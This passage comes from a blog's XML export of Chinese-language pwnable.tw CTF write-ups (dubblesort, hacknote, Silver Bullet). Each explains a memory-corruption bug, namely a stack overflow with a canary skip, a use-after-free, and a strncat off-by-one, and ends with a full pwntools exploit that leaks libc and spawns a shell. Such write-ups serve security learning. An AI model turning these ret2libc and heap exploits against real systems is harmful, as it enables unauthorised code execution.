<p>我们断在打印名字的地方<code>0xA32</code>看看</p>
<p><img src="https://i.loli.net/2021/07/13/nacEtulVQR4OXxD.png"></p>
<p>看到ecx的地方就是我们输入的名字，它下面有个got表的地址，距离是<code>dis = 0x58 - 0x3c = 0x1c</code></p>
<div class="note danger"><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>这个距离在我本地打得通，在远程是打不通的，参考了其他大佬的wp后发现，他们的gdb显示的距离算出来是0x18，而0x1c的地方是_init_array的地址，可能问题在我的虚拟机环境上？没搞明白o(╥﹏╥)o</p>
</div>

<p>于是就可以输入<code>dis</code>个<code>a</code>，加上一个回车是<code>\x0a</code>正好把got表地址最低位的<code>\x00</code>覆盖掉，也就不会被截断了，回显的时候减去<code>0x0a</code>就行</p>
<p>下面算一下got表的在libc中的偏移：</p>
<ul>
<li><p><strong>本地</strong>可以在gdb中用<code>vmmap</code>命令找到libc基址，用上面泄露的got表地址减去libc基址就是偏移，我本地是0x1b3000</p>
</li>
<li><p><strong>远程</strong>可以用<code>readelf -S libc_32.so.6</code>命令，找到<code>.got.plt</code>的地址</p>
<img src="https://i.loli.net/2021/07/13/KyJiZYQMRVmI9TW.png" style="zoom:50%;" />

<blockquote>
<p>got和plt的内容可以参考：<a href="https://www.jianshu.com/p/0ac63c3744dd">got表和plt表</a> ，<a href="https://www.jianshu.com/p/5092d6d5caa3">四个节的区别</a></p>
<p><a href="https://blog.csdn.net/yfldyxl/article/details/81566279">readelf命令</a></p>
</blockquote>
</li>
</ul>
<p>至此，libc地址就被泄露了</p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>观察程序可以发现，他没有限制我们输入数字的个数，那么很容易想到栈溢出，然后ret2libc</p>
<p>现在有两个问题：</p>
<ul>
<li>开了canary</li>
<li>它会从小到大排序后再写在栈上原来位置</li>
</ul>
<h4 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h4><blockquote>
<p>这里有个知识点是当scanf()读取非法字符时会发生格式错误，输入不会被写到栈上，由于没有清空缓冲区的函数，这个非法字符会一直留在缓冲区内，导致后面的输入也会报错，都不会被写到栈上。通过查看其它大佬的wp，发现+ - 这些字符会被视为合法输入，但是不会被写到栈上。</p>
</blockquote>
<p>那么在canary的地方放上<code>&#39;+&#39;</code>就行了</p>
<h4 id="布置栈"><a href="#布置栈" class="headerlink" title="布置栈"></a>布置栈</h4><p>先看从numbers到canary的距离为<code>0x7c - 0x1c = 0x60</code>，注意是按int输入的，所以这里要填充<code>0x60 / 4 = 24</code>个0</p>
<p><img src="https://i.loli.net/2021/07/13/TYqvzA5aQHO9bcN.png"></p>
<p>然后在canary填充一个<code>&#39;+&#39;</code></p>
<p>再看canary到retaddr的距离</p>
<p>这里有个很隐蔽的坑，main函数末尾这里，不是平常的<code>leave; retn;</code>，esp被动过了，所以算padding的时候不能用ida在变量那里显示的来算</p>
<p><img src="https://i.loli.net/2021/07/13/jSXfdZLTgFhQ4H6.png"></p>
<p>这样的话，距离就是<code>0x10 + 0xc = 0x1c</code>，所以填充<code>0x1c / 4 = 7</code>个字节的padding，考虑到后面放的就是system函数的地址<code>sys_addr</code>，要求从小到大，padding可以直接是<code>sys_addr</code></p>
<p>再后面是system函数的返回地址，这里是可以随便填一个不小于<code>sys_addr</code>的数，简单起见直接填<code>sys_addr</code></p>
<p>再后面是system函数的参数<code>&#39;\bin\sh&#39;</code>，巧合的是这个字符串在libc中地址刚好大于<code>sys_addr</code></p>
<p>所以如图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high addr            +---------------------------------+</span><br><span class="line">                     |            binsh-addr           |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                ebp  +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                     |               *7                |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |               &#x27;+&#x27;               | &lt;--- canary</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |               &#x27;0&#x27;               |</span><br><span class="line">                     |               *24               |</span><br><span class="line">low addr     numbers +---------------------------------+</span><br></pre></td></tr></table></figure>

<p>总共输入<code>24+1+7+3=35</code>个数字</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./dubblesort&quot;</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="comment">#r = process(&quot;./dubblesort&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line">local_got_offset = <span class="number">0x1b3000</span></span><br><span class="line">remote_got_offset = <span class="number">0x1b0000</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;name :&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>)  <span class="comment">#why remote is 24 but local is 28?</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello &#x27;</span>)</span><br><span class="line">r.recv(<span class="number">24</span>)</span><br><span class="line">libc_addr = u32(r.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line"><span class="comment">#libc_addr = libc_addr - local_got_offset</span></span><br><span class="line">libc_addr = libc_addr - remote_got_offset</span><br><span class="line">sys_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_addr:&quot;</span>, <span class="built_in">hex</span>(libc_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sys_addr:&quot;</span>, <span class="built_in">hex</span>(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr:&quot;</span>,<span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">24</span> + <span class="number">1</span> + <span class="number">7</span> + <span class="number">3</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;cnt:&quot;</span>,cnt</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(cnt))</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):        <span class="comment">#why 7? see code 0xB10</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(sys_addr))</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(sys_addr)) <span class="comment">#ret_addr</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(sys_addr)) <span class="comment">#ret_addr of sys</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(binsh_addr))</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://v1ckydxp.github.io/2019/05/01/pwnable-tw-dubblesort-writeup/">https://v1ckydxp.github.io/2019/05/01/pwnable-tw-dubblesort-writeup/</a></p>
<p><a href="https://blog.csdn.net/qq_43189757/article/details/102799397">https://blog.csdn.net/qq_43189757/article/details/102799397</a></p>
<p><a href="https://www.cnblogs.com/Rookle/p/12884543.html">https://www.cnblogs.com/Rookle/p/12884543.html</a></p>
<p><a href="https://www.cjovi.icu/WP/919.html">https://www.cjovi.icu/WP/919.html</a></p>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>stackoverflow</tag>
        <tag>ret2libc</tag>
      </tags>
  </entry>
  <entry>
    <title>hacknote</title>
    <url>/archives/c5963d96.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-hacknote"><a href="#pwnable-tw-hacknote" class="headerlink" title="pwnable.tw - hacknote"></a>pwnable.tw - hacknote</h2><span id="more"></span>

<hr>
<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先看保护：栈上不可执行，有canary，动态链接</p>
<p><img src="https://i.loli.net/2021/07/21/AKgWeCxqcZfmDh5.png"></p>
<p>下面看看程序流程，根据交互和main函数的逻辑可以初步判断各个函数的名字和作用</p>
<p><img src="https://i.loli.net/2021/07/21/cY9ZpFk8CQemDNv.png"></p>
<h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note()"></a>add_note()</h3><p><img src="https://i.loli.net/2021/07/21/XHlEADkxLdjiIWq.png"></p>
<p>首先，很明显，申请的note不能超过5个</p>
<p>然后，经过分析，可以看到，每次add_note会malloc两个堆块，一个8byte，我们叫做<code>head</code>；另一个大小是size（用户输入），叫做<code>data</code></p>
<p>那么这个ptr就是一个结构体（note_struct）的指针，note_struct里面有两个指针，分别指向head堆块和data堆块，于是可以创建一个结构体，并把ptr和v0的类型改成<code>note_stuct *</code></p>
<blockquote>
<p>关于ida中创建结构体：可参考<a href="https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html">https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html</a></p>
</blockquote>
<p>head堆块中存了一个函数output的地址，这个后面再看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ptr[i]  ---&gt; head: head_chunk_addr  ---&gt; output_addr  ---&gt; func_output</span><br><span class="line">        ---&gt; data: data_chunk_addr  ---&gt; data</span><br></pre></td></tr></table></figure>

<h3 id="print-note"><a href="#print-note" class="headerlink" title="print_note()"></a>print_note()</h3><p><img src="https://i.loli.net/2021/07/21/egV4iAkqnfBWpK7.png"></p>
<p>可以看到直接调用了head堆块中的那个函数，并且参数是<code>ptr[v1]</code>，那么来看一下output函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">output</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以把a1的类型改成<code>note_struct *</code>,</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">output</span><span class="params">(note_struct *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a1-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就很清晰了，打印data块的内容，也符合menu中的名字</p>
<p>（所以我把这个函数名改成output，原来就是个地址</p>
<h3 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note()"></a>delete_note()</h3><p><img src="https://i.loli.net/2021/07/21/dxgjQNH9DUERflM.png"></p>
<p>漏洞出现了！</p>
<p>它在free之后没有把<code>ptr[v1]</code>清空，就会有<code>use after free (uaf)</code>漏洞</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们可以利用print_note()，它会执行head指向的那个函数，所以只要我们能把head改成system的地址，后面放上命令，就能getshell了</p>
<p>我们先add两个note，大小随便，因为我们要打的是那个8字节的head，这里就用0x30</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add_note(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#add_note(size, data)</span></span><br><span class="line">add_note(<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>于是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbin</span><br><span class="line">fastbins</span><br><span class="line">0x10: 0x9c4d048(note1_head) —▸ 0x9c4d000(note0_head) ◂— 0x0</span><br><span class="line">0x18: 0x0</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x28: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x38: 0x9c4d058(note1_data) —▸ 0x9c4d010(note0_data) ◂— 0x0</span><br><span class="line">0x40: 0x0</span><br></pre></td></tr></table></figure>

<p>如果这个时候我们add一个note2，size写0x8，</p>
<p>note2_head就会写在note1_head，</p>
<p>note2_data就会写在note0_head，</p>
<blockquote>
<p>先malloc head块，再malloc data块</p>
</blockquote>
<p>然后print一下note0，就能执行我们想要的东西了</p>
<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>note2_data里写：原本output函数的地址+puts的got表地址，就能泄露libc</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>note2_data里写：system函数的地址+命令</p>
<p>这里命令的写法有些麻烦，因为print_note()调用head指向的函数时，传过去的参数是<code>ptr[v1]</code>，这个指针正好指向head，head里是我们覆盖的system_addr，system_addr显然不是个可以执行的命令，</p>
<p>所以我们得在命令里写<code>;sh;</code>，</p>
<ul>
<li>前一个分号：如果每个命令被一个分号 (;) 所分隔，那么命令会连续的执行下去，无论命令是否正确，<a href="https://blog.csdn.net/freedom2028/article/details/7104131">关于linux中连续命令执行</a></li>
<li>后一个分号是无所谓的，写个<code>\0</code>也行，只是填满8个字节</li>
<li>也可以写成<code>||sh</code>，因为<code>||</code>是执行到正确的命令才终止</li>
</ul>
<div class="note danger"><p>在泄露libc之后，要把note2释放掉</p>
<p>而因为delete_note()，是先free data块，再free head块，所以note2释放后正好和之前一样</p>
</div>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line"><span class="comment"># r = process(&quot;./hacknote&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">output_addr = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">add_note(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add_note(<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">payload = p32(output_addr) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">add_note(<span class="number">0x8</span>,payload)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u32(r.recv(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_addr:&quot;</span>, <span class="built_in">hex</span>(libc.address)</span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">&#x27;;sh;&#x27;</span></span><br><span class="line">add_note(<span class="number">0x8</span>,payload)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://v1ckydxp.github.io/2019/05/02/pwnable.tw-hacknote-writeup/">https://v1ckydxp.github.io/2019/05/02/pwnable.tw-hacknote-writeup/</a></p>
<p><a href="http://0gur1.cc/2018/03/08/pwnable-tw-hacknote/">http://0gur1.cc/2018/03/08/pwnable-tw-hacknote/</a></p>
<p><a href="https://medium.com/yuru-sec/pwnable-tw-hacknote-writeup-83129787adbb">https://medium.com/yuru-sec/pwnable-tw-hacknote-writeup-83129787adbb</a></p>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>uaf</tag>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Silver Bullet</title>
    <url>/archives/941745fe.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-Silver-Bullet"><a href="#pwnable-tw-Silver-Bullet" class="headerlink" title="pwnable.tw - Silver Bullet"></a>pwnable.tw - Silver Bullet</h2><span id="more"></span>

<hr>
<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先看保护</p>
<p><img src="https://i.loli.net/2021/07/26/8ABiG3jDKsftTvI.png"></p>
<p>没有canary，好消息</p>
<p>程序主要就三个函数：create_bullet()，power_up()，beat()</p>
<h3 id="create-bullet"><a href="#create-bullet" class="headerlink" title="create_bullet()"></a>create_bullet()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main</span></span><br><span class="line"><span class="keyword">char</span> s[<span class="number">0x30</span>]; <span class="comment">// [esp+8h] [ebp-34h] BYREF</span></span><br><span class="line"><span class="comment">//create_bullet</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">create_bullet</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// [esp+0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *s )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You have been created the Bullet !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your description of bullet :&quot;</span>);</span><br><span class="line">  read_input(s, <span class="number">0x30</span>u);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your power is : %u\n&quot;</span>, v2);</span><br><span class="line">  *((_DWORD *)s + <span class="number">12</span>) = v2;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Good luck !!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们输入的description字符串被放在了s数组中，而且输入最多0x30个字符；</p>
<p>而输入的字符个数放在了<code>*((_DWORD *)s + 12)</code>，就在<code>[ebp-4]</code>的位置放了一个int，考虑到小端表示&amp;数字小于0x30，其实就是放在了s[0x30]</p>
<p>其他也没什么特别的了，漏洞不在这</p>
<h3 id="beat"><a href="#beat" class="headerlink" title="beat()"></a>beat()</h3><p>逻辑很简单，wolf有个血量，调用这个函数会把血量减去<code>*((_DWORD *)s + 12)</code>这个值，如果血量&lt;=0，就win</p>
<p>没看出什么漏洞</p>
<h3 id="power-up"><a href="#power-up" class="headerlink" title="power_up()"></a>power_up()</h3><p>啊哈，这个函数看起来很复杂，漏洞应该就在这了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">power_up</span><span class="params">(<span class="keyword">char</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [esp+0h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [esp+30h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">if</span> ( !*dest )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You need create the bullet first !&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)dest + <span class="number">12</span>) &gt; <span class="number">0x2F</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t power up any more !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your another description of bullet :&quot;</span>);</span><br><span class="line">  read_input(s, <span class="number">0x30</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  <span class="built_in">strncat</span>(dest, s, <span class="number">0x30</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s) + *((_DWORD *)dest + <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new power is : %u\n&quot;</span>, v3);</span><br><span class="line">  *((_DWORD *)dest + <span class="number">12</span>) = v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Enjoy it !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<div class="note danger"><p>这里要注意一下函数里的s不是main函数里的s，main函数的s是作为dest传进来的（也可以用快捷键n修改一下这些变量名</p>
</div>

<p>可以看到，这里是用<code>*((_DWORD *)dest + 12)</code>的值来控制我们输入的字符数，来防止栈溢出</p>
<p>而且他用了<code>strncat</code>，看似很安全</p>
<p><strong>但是<code>strncat</code>会在追加好之后在后面加一个<code>\x00</code></strong></p>
<blockquote>
<p>Appends the first <em>num</em> characters of <em>source</em> to <em>destination</em>, <strong>plus a terminating null-character</strong>.</p>
<p>from <a href="https://www.cplusplus.com/reference/cstring/strncat/">https://www.cplusplus.com/reference/cstring/strncat/</a></p>
</blockquote>
<p>而<code>*((_DWORD *)dest + 12)</code>就在字符串的末尾后的一个字节（上文分析过），也就是说：</p>
<p>如果power_up的时候，<code>len(dest) + len(s) = 0x30</code>，<code>*((_DWORD *)dest + 12)</code>的第一个字节就会被覆盖成<code>\x00</code>，然后<code>*((_DWORD *)dest + 12) = v3 = strlen(s)</code></p>
<p>这样我们就可以栈溢出了：</p>
<div class="note info"><p>如果create的时候写<code>0x2f</code>个字符，powerup时候写<code>1</code>个字符，</p>
<p>那就可以再写<code>0x30 - 0x1 = 0x2f</code>个字符，绰绰有余</p>
</div>

<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="padding"><a href="#padding" class="headerlink" title="padding"></a>padding</h3><p>在上述操作之后，栈上是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ebp-0x34       +--------------------+</span><br><span class="line">               |                    |</span><br><span class="line">               |     &#x27;a&#x27;*0x30       |</span><br><span class="line">               |                    |</span><br><span class="line">ebp-0x4        +--------------------+</span><br><span class="line">               |&#x27;\x01&#x27;|             | &lt;-- *((_DWORD *)dest + 12)</span><br><span class="line">               +--------------------+</span><br><span class="line">               |        ebp         |</span><br><span class="line">               +--------------------+</span><br><span class="line">               |      retaddr       |</span><br><span class="line">               +--------------------+</span><br></pre></td></tr></table></figure>

<p>我们再次power_up的话，就会写在那个<code>&#39;\x01&#39;</code>后面</p>
<p>这里需要注意，我们布置好栈上数据之后要在main函数return才能触发，</p>
<p>main函数中return的条件是beat成功，</p>
<p>那么就要使<code>*((_DWORD *)dest + 12)</code>的值大于<code>0x7fffffff</code>，只需要在<code>&#39;\x01&#39;</code>后面放三个<code>&#39;\xff&#39;</code>就行，显然<code>0xffffff01 &gt; 0x7fffffff</code></p>
<p>ebp就随便覆盖点什么就行</p>
<h3 id="leak-libc-amp-getshell"><a href="#leak-libc-amp-getshell" class="headerlink" title="leak libc &amp; getshell"></a>leak libc &amp; getshell</h3><ul>
<li><p>程序里有puts函数，那就把retaddr覆盖成puts的地址，参数写puts的got表地址（用puts把puts的真实地址打印出来</p>
<p>返回地址就写main函数</p>
</li>
<li><p>然后再来一遍，这次把retaddr覆盖成libc中system的地址，参数在libc中找一个’/bin/sh’的地址，返回地址随便写</p>
</li>
</ul>
<p><em><strong>Bingo</strong></em> ~~~</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./silver_bullet&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./silver_bullet&quot;)</span></span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10103</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">data</span>):</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power</span>(<span class="params">data</span>):</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beat</span>():</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048954</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">create(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2f</span>)</span><br><span class="line">power(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\xff&#x27;</span>*<span class="number">3</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(main_addr) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">power(payload)</span><br><span class="line">beat()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;win !!\n&#x27;</span>)</span><br><span class="line">libc.address = u32(r.recv(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_address:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">create(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2f</span>)</span><br><span class="line">power(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\xff&#x27;</span>*<span class="number">3</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(libc.sym[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeaf</span>) + p32(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>())</span><br><span class="line">power(payload)</span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

